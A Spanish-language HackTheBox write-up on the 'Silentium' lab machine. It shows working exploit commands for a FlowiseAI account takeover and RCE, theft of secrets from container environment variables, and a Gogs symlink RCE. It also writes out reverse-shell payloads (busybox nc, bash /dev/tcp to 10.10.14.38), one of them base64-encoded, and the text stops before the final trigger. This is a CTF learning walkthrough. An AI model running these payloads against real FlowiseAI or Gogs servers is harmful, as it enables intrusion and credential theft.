---
title: Silentium - Easy (HTB)
permalink: /Silentium-HTB-Writeup/
tags:
  - Linux
  - Easy
  - CVE-2025-58434
  - CVE-2025-59528
  - FlowiseAI
  - "Credentials Leakage"
  - "Local Port Forwarding"
  - Gogs
  - CVE-2025-64111
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Silentium - Easy (HTB)
seo_description: Explota CVEs en el servicio FlowiseAI y Gogs para vencer Silentuim.
excerpt: Explota CVEs en el servicio FlowiseAI y Gogs para vencer Silentuim.
header:
  overlay_image: /assets/images/headers/silentium-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/silentium-hackthebox.jpg
---
![image-center](/assets/images/posts/silentium-hackthebox.png)
{: .align-center}

**Habilidades:** Subdomain Fuzzing, CVE-2025-58434 + CVE-2025-59528 - `FlowiseAI` Unauthenticated Account Takeover + Remote Code Execution, Credentials Leakage, System Enumeration, Local Port Forwarding, CVE-2025-64111 - `Gogs` Remote Code Execution via Symbolic Links
{: .notice--primary}

# Introducción

Silentium es una máquina Linux de dificultad `Easy` en HackTheBox en la cual debemos explotar algunas vulnerabilidades conocidas (CVEs) en la plataforma `FlowiseAI`, luego de obtener credenciales dentro de un contenedor podremos ganar acceso inicial.

Una vez dentro, descubriremos el servicio `Gogs`, el cual es vulnerable a ejecución de comandos a través de un mal manejo de archivos en repositorios, lo que nos permitirá obtener acceso privilegiado al servidor.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

``` bash
export TARGET_IP=10.129.19.7
ping -c1 $TARGET_IP
PING 10.129.19.7 (10.129.19.7) 56(84) bytes of data.
64 bytes from 10.129.19.7: icmp_seq=1 ttl=62 time=204 ms

--- 10.129.19.7 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 204.486/204.486/204.486/0.000 ms
```


## Port Scanning 

Lanzaremos un escaneo de puertos con el fin de identificar servicios expuestos en la máquina víctima

``` bash
rustscan -a $TARGET_IP --ulimit 5000 -- -sC -sV -Pn -n -oN services

Nmap scan report for 10.129.19.7
Host is up, received user-set (0.31s latency).
Scanned at 2026-04-12 02:47:47 -04 for 14s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c4bd276ab10069205dcf755947f18df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d6d4a4cee2e11b6c890e683e9df38b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:48
Completed NSE at 02:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:48
Completed NSE at 02:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:48
Completed NSE at 02:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.72 seconds
           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)
```

> Considera usar este tipo de escaneos con `rustscan` exclusivamente en entornos de CTFs, para otros entornos revisa la siguiente advertencia publicada en [`Github`](https://github.com/bee-san/RustScan/wiki/Usage#%EF%B8%8F-warning).
{: .notice--warning}

- `--ulimit 5000`: Acelera el escaneo incrementando el descriptor de archivo.
- `-sC`: Lanzar scripts de reconocimiento más comunes.
- `-sV`: Intentar identificar la versión del servicio que ejecuta el puerto.
- `-Pn`: Omitir descubrimiento de host (`ARP Scan`).
- `-n`: Omitir la resolución `DNS`.
- `-oN`: Exportar en formato normal, tal como se ve por consola.


## Web Enumeration

En la captura de `nmap` podremos ver que el servidor posee un nombre de dominio, el cual es `silentium.htb`.

Agregaremos este dominio a nuestro archivo `/etc/hosts` con el fin de aplicar correctamente la resolución `DNS`

``` bash
echo "$TARGET_IP silentium.htb" | sudo tee -a /etc/hosts   
10.129.20.212 silentium.htb
```

Antes de navegar hasta el dominio `silentium.htb`, podemos lanzar un escaneo preliminar a las tecnologías web que el servidor está utilizando para gestionar el contenido

``` bash
whatweb http://silentium.htb/ 
http://silentium.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.19.7], Script, Title[Silentium | Institutional Capital & Lending Solutions], nginx[1.24.0]
```

En este caso se nos presenta `nginx 1.24.0`, sistema operativo `Ubuntu`, además del título de la página web

Al navegar hasta el dominio `silentium.htb`, veremos la siguiente página

![image-center](/assets/images/posts/silentium-1-hackthebox.png)
{: .align-center}

Inspeccionando el contenido de la web, notaremos que al final se muestran posibles nombres de usuario

![image-center](/assets/images/posts/silentium-2-hackthebox.png)
{: .align-center}

Nos quedaremos con estos posibles nombres de usuario para más adelante


## Subdomain Fuzzing

> Luego de pruebas usando `Fuzzing`, no encontraremos mayor información dentro de este dominio. 
{: .notice--danger}

Como el servidor web utiliza un nombre de dominio debido a que aplica `Virtual Hosting`, es posible que también existan otros servicios web disponibles en el servidor.

Enumeraremos la web en búsqueda de subdominios usando herramientas como `gobuster`, `ffuf`, `wfuzz`, etc.

``` bash
gobuster vhost -u silentium.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain  
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://silentium.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
staging.silentium.htb Status: 200 [Size: 3142]
```

Hemos encontrado un subdominio llamado `staging.silentium.htb`, lo agregaremos a nuestro archivo `/etc/hosts` al igual que el anterior para evitar problemas de resolución `DNS`

``` bash
sudo sed -i '' 's/silentium.htb/& staging.&/' /etc/hosts 
```

### FlowiseAI

> `FlowiseAI` es una plataforma de código abierto y "bajo código" (`low-code`) que permite diseñar, construir y desplegar aplicaciones basadas en Grandes Modelos de Lenguaje (`LLMs`) y agentes de IA mediante una interfaz visual de arrastrar y soltar
{: .notice--info}

Cuando visitemos el subdominio `staging.silentium.htb`, veremos la siguiente web de inicio de sesión. 

El título de la pestaña nos dice que la tecnología empleada es `FlowiseAI`, y buscando un poco en internet encontraremos que cuenta con un servicio de [`API`](https://docs.flowiseai.com/api-reference)

![image-center](/assets/images/posts/silentium-3-hackthebox.png)
{: .align-center}

A través de la `API` podremos consultar la versión de `Flowise` bajo el endpoint `/api/v1/version`

``` bash
curl http://staging.silentium.htb/api/v1/version
{"version":"3.0.5"}
```

Buscando en internet por `CVEs` asociados a esta versión encontraremos un conjunto de vulnerabilidades interesantes

![image-center](/assets/images/posts/silentium-4-hackthebox.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## CVE-2025-59528 - FlowiseAI Remote Code Execution

[CVE-2025-59528](https://nvd.nist.gov/vuln/detail/CVE-2025-58434) es una vulnerabilidad que afecta a las versiones anteriores a la `3.0.5` del software `Flowise`, permite la ejecución remota de comandos a través del mal manejo de configuraciones para el nodo `CustomMCP` (`Model Context Protocol`)
 
### Understanding Vulnerability

El nodo `CustomMCP` permite a los usuarios introducir configuraciones para conectarse a un servidor `MCP` externo. 
 
 Este nodo analiza la cadena `mcpServerConfig` proporcionada por el usuario para construir la configuración del servidor `MCP`. 
 
 Sin embargo, durante este proceso, ejecuta código `JavaScript` sin ninguna validación de seguridad. Específicamente, dentro de la función [`convertToValidJSONString`](https://github.com/FlowiseAI/Flowise/blob/5930f1119c655bcf8d2200ae827a1f5b9fec81d0/packages/components/nodes/tools/MCP/CustomMCP/CustomMCP.ts#L262), la entrada del usuario se pasa directamente al constructor `Function()`, que evalúa y ejecuta la entrada como código `JavaScript`. 
 
 Dado que esto se ejecuta con privilegios completos de tiempo de ejecución de `Node.js`, puede acceder a módulos peligrosos como `child_process` y `fs`

### (Failed) Failed

La siguiente [prueba de concepto](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p) explica cómo explotar esta vulnerabilidad a través de una solicitud `POST` hacia el nodo `customMCP` de la `API` 

``` bash
curl -X POST http://localhost:3000/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer tmY1fIjgqZ6-nWUuZ9G7VzDtlsOiSZlDZjFSxZrDd0Q" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo !!RCE-OK!! >/tmp/RCE.txt\");return 1;})()})"
    }
  }'
```

> Sin embargo, tendremos un problema, y es que este `CVE` necesita un token de `API`, lo cual significa que requiere autenticación previa.
> 
> Es por esto que nos enfocaremos en buscar alguna otra vulnerabilidad que nos permita comprometer alguna cuenta o algo por el estilo.
{: .notice--danger}


## CVE-2025-58434 - Flowise Unauthenticated Account Takeover

[CVE-2025-58434](https://nvd.nist.gov/vuln/detail/CVE-2025-58434) es una vulnerabilidad que afecta al software `Flowise` hasta la versión `3.0.5`, esta permite comprometer una cuenta sin necesidad de autenticación a través de consultas a la `API`

### Understanding Vulnerability

El endpoint `forgot-password` en `Flowise` retorna información sensible que incluye un token temporal (`tempToken`) de una cuenta sin validar autenticación previa.

Esto permite a un atacante solicitar un token para una cuenta válida dentro de `Flowise`, para posteriormente restablecer su contraseña directamente a través del uso de ese `tempToken`, para así completar un ataque `Account Takeover` (`ATO`)

### Exploiting

> Recordemos los posibles nombres de usuario que vimos en el dominio principal, podemos intentar solicitar un cambio de contraseña para cada una de estas cuentas y validar si el servidor nos responde y permite comprometerlas.
{: .notice--warning}

Con el siguiente comando podremos obtener rápidamente estos nombres de usuario para guardarlos en un archivo

``` bash
curl -s http://silentium.htb/ | pup 'div.team-card h3 text{}' | tr -d ' ' | awk '{print tolower($0)}' | tee users.txt 
marcusthorne
ben
elenarossi
```

Según la siguiente [prueba de concepto](https://github.com/advisories/GHSA-wgpv-6j63-x5ph), necesitaremos enviar una solicitud `POST` al endpoint `forgot-password`, enviando datos sobre el usuario objetivo en un `JSON`.

``` bash
# Evil request
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \ 
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"<user>@silentium.htb"}}'                                     

# all users
while read user; do echo "[*] Trying with $user"; curl -sX POST http://staging.silentium.htb/api/v1/account/forgot-password -H "Content-Type: application/json" -d "{\"user\":{\"email\":\"$user@silentium.htb\"}}" | jq; echo; done < users.txt
[*] Trying with marcusthorne
{
  "statusCode": 404,
  "success": false,
  "message": "User Not Found",
  "stack": {}
}

[*] Trying with ben
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
    "tempToken": "L4attFUqKtqAaJPpD0b3B5KjT68RwLoeeVjimv9a4qKS4OVzHxJmvfE2lhZjBwu9",
    "tokenExpiry": "2026-04-13T16:28:19.307Z",
    "status": "active",
    "createdDate": "2026-01-29T20:14:57.000Z",
    "updatedDate": "2026-04-13T16:13:19.000Z",
    "createdBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "updatedBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73"
  },
  "organization": {},
  "organizationUser": {},
  "workspace": {},
  "workspaceUser": {},
  "role": {}
}

[*] Trying with elenarossi
{
  "statusCode": 404,
  "success": false,
  "message": "User Not Found",
  "stack": {}
}  
```

El siguiente paso es enviar una solicitud `POST` al endpoint `reset-password` solicitando un cambio de contraseña para el usuario `ben`

``` bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
        "user":{
          "email":"ben@silentium.htb", 
          "tempToken":"L4attFUqKtqAaJPpD0b3B5KjT68RwLoeeVjimv9a4qKS4OVzHxJmvfE2lhZjBwu9",
          "password":"NewSecurePassword123!"
        }
      }'
HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 11 Apr 2026 19:25:23 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 493
Connection: keep-alive
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"1ed-7uXmxCGndEd9QOYM+d0VGuUgx38"

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$.mi0Xwbzs1zsOVyo141k..WtQzILLECHsJBFCzQQWXKiyk3Og4c8C","tempToken":"","tokenExpiry":null,"status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-11T19:25:23.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}#       
```


## Web Access as `ben`

Ahora validaremos las nuevas credenciales para el usuario `ben` iniciando sesión en la plataforma 

![image-center](/assets/images/posts/silentium-5-hackthebox.png)
{: .align-center}

Para explotar la vulnerabilidad que investigamos anteriormente (`RCE`), necesitábamos una `API Key`, la cual ya podremos obtener desde pestaña `API Keys`

![image-center](/assets/images/posts/silentium-6-hackthebox.png)
{: .align-center}

### Exploiting RCE

Ya podremos ejecutar comandos en el servidor usando CVE-2025-59528, pasando la `API Key` en la cabecera `Authorization`

> Podemos probar diferentes payloads desde [`revshells.com`](https://www.revshells.com/) para ganar acceso a través de una reverse shell en la máquina víctima.
{: .notice--warning}

``` bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"busybox nc 10.10.14.38 443 -e sh\");return 1;})()})"
    }
  }'
```


## Shell as `root` in Flowise Container

Cuando lancemos la reverse shell, en nuestro listener recibiremos una consola como el usuario `root`. Aunque realmente ganaremos acceso a un contenedor

``` bash
nc -lvnp 443
Connection from 10.129.20.212:44753
whoami
root
hostname
c78c3cceb7ba
hostname -i
172.18.0.2
```

> Si intentamos un tratamiento normal usando el comando `script`, no obtendremos resultado. Podemos usar un tratamiento en `python3`: `python3 -c 'import pty; pty.spawn("/bin/sh")'`.
{: .notice--warning}

``` bash
python3 -c 'import pty; pty.spawn("/bin/sh")'          
/ # / # ls      
ls
bin    etc    lib    mnt    proc   run    srv    tmp    var
dev    home   media  opt    root   sbin   sys    usr

/ # stty rows 42 columns 152 # Proporciones de la terminal
stty rows 42 columns 152 
/ #
```


## Credentials Leakage

Si inspeccionamos las variables de entorno, veremos dos variables que están definidas como contraseñas, `FLOWISE_PASSWORD` y `SMTP_PASSWORD`

``` bash
/ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

Además, existe una variable de entorno llamada `SENDER_EMAIL`, la cual define al usuario que envía los correos electrónicos, esto puede ser la pista que necesitamos para pensar que `ben` también es válido en el sistema.

> Las credenciales del usuario `ben` corresponderían a la variable `SMTP_PASSWORD`.
{: .notice--danger}


## Shell as `ben`

Utilizaremos las credenciales para iniciar sesión en la máquina real por `ssh` como el usuario `ben`

``` bash
sshpass -p 'r04D!!_R4ge' ssh -oStrictHostKeyChecking=no ben@silentium.htb
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Apr 13 07:22:33 PM UTC 2026

  System load:           0.13
  Usage of /:            83.0% of 13.37GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             230
  Users logged in:       0
  IPv4 address for eth0: 10.129.20.212
  IPv6 address for eth0: dead:beef::250:56ff:feb0:33ee

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
ben@silentium:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
ben@silentium:~$ export TERM=xterm # Ctrl+L
```

Ya podremos ver la primera flag ubicada en el directorio `/home/ben`

``` bash
ben@silentium:~$ cat user.txt 
25f...
```
<br>


# Escalada de Privilegios
---
## System Enumeration

Como ya estamos dentro de la máquina objetivo, enumeraremos el sistema en búsqueda de una vía potencial mediante la cual podamos convertirnos en el usuario con máximos privilegios (`root`)

### Users

Listando los usuarios del sistema desde el archivo `/etc/passwd`, veremos que solamente existen `ben` y `root`

``` bash
ben@silentium:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ben:x:1000:1000:,,,:/home/ben:/bin/bash
```

### Processes

Listando los procesos en ejecución no veremos nada interesante, excepto por una herramienta llamada `gogs`

``` bash
ps faux

...
<SNIP>
...
root        1520  0.0  1.7 1738544 69952 ?       Ssl  14:29   0:04 /opt/gogs/gogs/gogs web
...
<SNIP>
...
```

### Open Ports

En cuanto a puertos abiertos, veremos algunos abiertos internamente (que apuntan a `127.0.0.1`)

``` bash
ben@silentium:~$ ss -tunl | grep LISTEN
tcp   LISTEN 0      4096       127.0.0.1:8025       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:1025       0.0.0.0:*          
tcp   LISTEN 0      4096      127.0.0.54:53         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:33431      0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
tcp   LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:3001       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      511             [::]:80            [::]:*          
tcp   LISTEN 0      4096            [::]:22            [::]:*
```

- El puerto `3000` ejecuta el servicio `Flowise`.
- Puerto `1025` y `8025` ejecutan servicio `Mailhog`, el cual simula ser un servidor `SMTP`.

### Gogs

Aún nos queda por investigar el puerto `3001`, el cual si le hacemos un `curl` (de forrma totalmente a ciegas, puede que ni siquiera sea un servicio que acepte el protocolo `HTTP`), veremos que se trata de un servicio llamado `Gogs`.

> `Gogs` (`Go Git Service`) es un servicio de alojamiento de repositorios `Git` autoalojado, de código abierto y extremadamente ligero, escrito en el lenguaje `Go`.
{: .notice--info}

``` bash
ben@silentium:~$ curl -si localhost:3001 | head -n 30
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
Set-Cookie: i_like_gogs=fbdd6871b942de45; Path=/; HttpOnly
Set-Cookie: _csrf=vcoGieZsjHxD8SUvSc6nPYjDUXc6MTc3NjExMDQxMDQ1OTU2NDY1NA; Path=/; Domain=staging-v2-code.dev.silentium.htb; Expires=Tue, 14 Apr 2026 20:00:10 GMT; HttpOnly
X-Content-Type-Options: nosniff
X-Frame-Options: deny
Date: Mon, 13 Apr 2026 20:00:10 GMT
Transfer-Encoding: chunked

<!DOCTYPE html>
<html>
<head data-suburl="">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
	
		<meta name="author" content="Gogs" />
		<meta name="description" content="Gogs is a painless self-hosted Git service" />
		<meta name="keywords" content="go, git, self-hosted, gogs">
	
	<meta name="referrer" content="no-referrer" />
	<meta name="_csrf" content="vcoGieZsjHxD8SUvSc6nPYjDUXc6MTc3NjExMDQxMDQ1OTU2NDY1NA" />
	<meta name="_suburl" content="" />

	
	
		<meta property="og:url" content="http://staging-v2-code.dev.silentium.htb:3001/" />
		<meta property="og:type" content="website" />
		<meta property="og:title" content="Gogs">
		<meta property="og:description" content="Gogs is a painless self-hosted Git service.">
```

- `| head -n 30` mostrará las primeras `30` líneas de la salida del comando `curl` que lanzamos.

En el proceso vimos también el directorio donde se aloja el servicio, en este caso es `/opt`

``` bash
ben@silentium:~$ ls -la /opt/gogs/
total 24
drwxr-xr-x 6 root root 4096 Apr  8 09:41 .
drwxr-xr-x 4 root root 4096 Apr  8 18:30 ..
drwxr-x--- 3  750 root 4096 Apr  8 09:41 custom
drwxr-x--- 2  750 root 4096 Apr  8 17:46 data
drwxr-xr-x 6 root root 4096 Apr  8 09:41 gogs
drwxr-x--- 2  750 root 4096 Apr 13 14:29 log
```

Dentro del directorio `gogs` encontraremos el ejecutable principal de la herramienta, llamado `gogs`

``` bash
ben@silentium:~$ /opt/gogs/gogs/gogs 
NAME:
   Gogs - A painless self-hosted Git service

USAGE:
   gogs [global options] command [command options] [arguments...]

VERSION:
   0.13.3

COMMANDS:
   web      Start web server
   serv     This command should only be called by SSH shell
   hook     Delegate commands to corresponding Git hooks
   cert     Generate self-signed certificate
   admin    Perform admin operations on command line
   import   Import portable data as local Gogs data
   backup   Backup files and database
   restore  Restore files and database from backup
   help, h  Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --help, -h     show help
   --version, -v  print the version
```

Podemos ver que se trata de la versión `0.13.3`. Lo primero que haremos será buscar vulnerabilidades asociadas en internet

![image-center](/assets/images/posts/silentium-7-hackthebox.png)
{: .align-center}

Parece que esta versión posee varias vulnerabilidades, según la publicación de [`Tentacle`](https://www.tenable.com/plugins/nessus/286268), esta versión es vulnerable a `RCE` a través de CVE-2025-8110, CVE-2025-8111 y CVE-2026-23633 


## Local Port Forwarding

Para tener alcance de forma cómoda con el servicio `Gogs`, podemos reenviar el puerto `3001` de forma local

``` bash
sshpass -p 'r04D!!_R4ge' ssh -oStrictHostKeyChecking=no ben@silentium.htb -L 3001:127.0.0.1:3001 -fN 
```

- `-L`: Reenvío de puertos local.
- `-fN`: Correr el proceso en segundo plano y no abrir una shell.


## CVE-2025-64111 - `Gogs` Remote Code Execution via Symbolic Links

[CVE-2025-64111](https://nvd.nist.gov/vuln/detail/CVE-2025-64111) es una vulnerabilidad crítica en el software `Gogs` que permite la inyección de comandos a través de archivos maliciosos en el directorio `.git`. Este fallo afecta a las versiones igual o inferiores a la `0.13.3`.

Esta vulnerabilidad explota el parche de CVE-2024-56731, donde todavía es posible actualizar archivos en el directorio `.git` y lograr la ejecución remota de comandos usando enlaces simbólicos

### Understanding Vulnerability

Debido a un parche incompleto para CVE-2024-56731, aún permite manipular archivos dentro del directorio `.git`.

La función [`UpdateRepoFile`](https://github.com/gogs/gogs/blob/d940e692ec58abd45e648c054d7dfd88909034ec/internal/route/api/v1/repo/contents.go#L197-L206) aplica verificaciones de seguridad bajo ciertas condiciones `if`. 

Sin embargo, la llamada desde el router de la `API` no coincide con ninguna de ellas, esto permite actualizar archivos como `.git/config` directamente a través de un endpoint de la `API`, como `/api/v1/repos/<username>/<repo>/contents/evil-link`, el cual.

Frente a eso, se utiliza un enlace simbólico para editar el archivo que contiene el enlace simbólico a `.git/config`, por lo que se terminaría editando el contenido de este archivo crítico.

> Editando el archivo `.git/config`, el uso de la directiva `core.sshCommand` permite ejecutar un comando a nivel de sistema.
{: .notice--warning}

### Setup

Comenzaremos registrando una nueva cuenta en la plataforma `Gogs`

![image-center](/assets/images/posts/silentium-8-hackthebox.png)
{: .align-center}

Procederemos a crear un nuevo repositorio bajo esta nueva cuenta, en mi caso lo llamé `evil-repo`

![image-center](/assets/images/posts/silentium-9-hackthebox.png)
{: .align-center}

Como necesitamos acceso a la `API`, crearemos una nueva clave desde `Settings` > `Applications` > `Generate New Token`

![image-center](/assets/images/posts/silentium-10-hackthebox.png)
{: .align-center}

### Config

Necesitaremos configurar un repositorio local o clonar el repositorio remoto para interactuar con él

``` bash
git init
git remote add origin http://localhost:3001/incommatose/evil-repo
```

Añadiremos la configuración del usuario con el fin de que el servidor pueda identificarnos cuando enviemos cambios

``` bash

git config user.email "test@test.com"
git config user.name "incommatose"
```

### Exploiting

Existen algunas pruebas de concepto disponibles, como el repositorio de [`zAbuQasem`](https://github.com/zAbuQasem/gogs-CVE-2025-8110) en `Github`, además del [advisory](https://github.com/gogs/gogs/security/advisories/GHSA-gg64-xxr9-qhjp) publicado también en `Github`.

Una vez hayamos configurado el repositorio, procederemos a subir un archivo que contiene un enlace simbólico a `.git/config`

``` bash
ln -s .git/config
git add link
git commit -m 'add'
```

Con los cambios preparados, los subiremos al repositorio a través del comando `git push`

``` bash
git push origin master            
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 208 bytes | 41.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Username for 'http://localhost:3001': incommatose 
Password for 'http://incommatose@localhost:3001': 
To http://localhost:3001/incommatose/evil-repo.git
 * [new branch]      master -> master
```

Crearemos un archivo de configuración malicioso que contenga un comando malicioso dentro de la directiva `sshCommand`.

> Luego de muchas pruebas de sintaxis y diferentes payloads, por alguna razón solo me funcionó la siguiente configuración, la cual extraje del PoC de `Github` del usuario [`zAbuQasem`](https://github.com/zAbuQasem/gogs-CVE-2025-8110).
{: .notice--danger}

``` bash
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
  sshCommand = bash -c 'bash -i >& /dev/tcp/10.10.14.38/443 0>&1' #
[remote "origin"]
	url = git@silentium.htb:gogs/evil-repo.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

> En este caso podemos ajustar la directiva `url` para que coincida con el nombre de nuestro repositorio.
{: .notice--warning}

Codificaremos este contenido en `base64` para que pueda ser procesado correctamente por la `API`

``` bash
cat evil-config.txt | base64 -w0; echo
W2NvcmVdCglyZXBvc2l0b3J5Zm9ybWF0dmVyc2lvbiA9IDAKCWZpbGVtb2RlID0gdHJ1ZQoJYmFyZSA9IGZhbHNlCglsb2dhbGxyZWZ1cGRhdGVzID0gdHJ1ZQoJaWdub3JlY2FzZSA9IHRydWUKCXByZWNvbXBvc2V1bmljb2RlID0gdHJ1ZQogIHNzaENvbW1hbmQgPSBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM4LzQ0MyAwPiYxJyAjCltyZW1vdGUgIm9yaWdpbiJdCgl1cmwgPSBnaXRAc2lsZW50aXVtLmh0Yjpnb2dzL2V2aWwtcmVwby5naXQKCWZldGNoID0gK3JlZnMvaGVhZHMvKjpyZWZzL3JlbW90ZXMvb3JpZ2luLyoKW2JyYW5jaCAibWFzdGVyIl0KCXJlbW90ZSA9IG9yaWdpbgoJbWVyZ2UgPSByZWZzL2hlYWRzL21hc3Rlcgo=
```


## Root Time

Antes de enviar la solicitud a la `API` para iniciar la ejecución del comando, debemos iniciar un listener en el puerto que definimos en la configuración

``` bash
nc -lvnp 443
```

Ahora enviaremos una solicitud `POST` a la `API` de `Gogs`, editaremos el contenido del archivo que contiene el enlace simbólico, en este caso lo llamamos `link`

> En este caso el endpoint será `/api/v1/repos/<user>/<evil-repo>/contents/<link-file>`
{: .notice--info}

``` bash
export TOKEN='77c8d1a360ffaa239fdc1d2f11e0df33cb25afb9' # Preparar el API Token 

# Trigger
